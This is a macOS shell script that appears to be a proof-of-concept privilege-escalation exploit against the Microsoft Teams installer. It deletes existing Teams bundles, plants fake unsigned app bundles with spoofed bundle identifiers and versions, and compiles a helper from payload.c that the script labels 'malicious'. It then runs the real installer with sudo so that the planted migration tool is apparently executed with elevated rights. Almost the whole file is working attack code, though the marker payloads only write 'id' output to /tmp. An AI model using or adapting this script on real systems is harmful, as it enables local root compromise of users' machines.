#!/bin/sh

OUR_TEAMS_APP="/Applications/Microsoft Teams.app"
OLD_BUNDLE_PATH1="/Applications/Microsoft Teams (work or school).app"
OLD_BUNDLE_PATH2="/Applications/Microsoft Teams (work preview).app"
TEAMS_CLASSIC_PATH="/Applications/Microsoft Teams classic.app"
TEAMS_CLASSIC_BUNDLE_ID="com.microsoft.teams"

echo "[+] Clean /Applications folder"
rm -rf "$OUR_TEAMS_APP"
rm -rf "$OLD_BUNDLE_PATH1"
rm -rf "$OLD_BUNDLE_PATH2"
rm -rf "$TEAMS_CLASSIC_PATH"

echo "[+] Create $OUR_TEAMS_APP"
osacompile -o "$OUR_TEAMS_APP" -e 'do shell script "id > /tmp/OUR_TEAMS_APP"'
codesign --remove-signature "$OUR_TEAMS_APP/"
mv "$OUR_TEAMS_APP/Contents/MacOS/applet" "$OUR_TEAMS_APP/Contents/MacOS/MSTeams"

/usr/libexec/PlistBuddy -c "Add CFBundleIdentifier string" "$OUR_TEAMS_APP/Contents/Info.plist"
/usr/libexec/PlistBuddy -c "Set :CFBundleIdentifier com.microsoft.teams3" "$OUR_TEAMS_APP/Contents/Info.plist"
/usr/libexec/PlistBuddy -c "Set :CFBundleExecutable MSTeams" "$OUR_TEAMS_APP/Contents/Info.plist"
/usr/libexec/PlistBuddy -c "Add CFBundleVersion string" "$OUR_TEAMS_APP/Contents/Info.plist"
/usr/libexec/PlistBuddy -c "Set :CFBundleVersion 24152.405.2925.6762" "$OUR_TEAMS_APP/Contents/Info.plist"

/usr/libexec/PlistBuddy -c "Add CFBundleShortVersionString string" "$OUR_TEAMS_APP/Contents/Info.plist"
/usr/libexec/PlistBuddy -c "Set :CFBundleShortVersionString 24152.405.2925.6762" "$OUR_TEAMS_APP/Contents/Info.plist"

echo "[+] Create our malicious 'com.microsoft.teams2.migrationtool'"
mkdir "$OUR_TEAMS_APP/Contents/Helpers"
gcc -o "$OUR_TEAMS_APP/Contents/Helpers/com.microsoft.teams2.migrationtool" payload.c

echo "[+] Create $OLD_BUNDLE_PATH1"
osacompile -o "$OLD_BUNDLE_PATH1" -e 'do shell script "id > /tmp/OLD_BUNDLE_PATH1"'
echo "[+] Create $OLD_BUNDLE_PATH2"
osacompile -o "$OLD_BUNDLE_PATH2" -e 'do shell script "id > /tmp/OLD_BUNDLE_PATH2"'
echo "[+] Create $TEAMS_CLASSIC_PATH"
osacompile -o "$TEAMS_CLASSIC_PATH" -e 'do shell script "id > /tmp/TEAMS_CLASSIC_PATH"'

/usr/libexec/PlistBuddy -c "Add CFBundleIdentifier string" "$TEAMS_CLASSIC_PATH/Contents/Info.plist"
/usr/libexec/PlistBuddy -c "Set :CFBundleIdentifier $TEAMS_CLASSIC_BUNDLE_ID" "$TEAMS_CLASSIC_PATH/Contents/Info.plist"

echo "[+] Force installing real Microsoft Teams application (simulate a real user installation)"
sudo installer -package ~/Downloads/MicrosoftTeams.pkg -target /
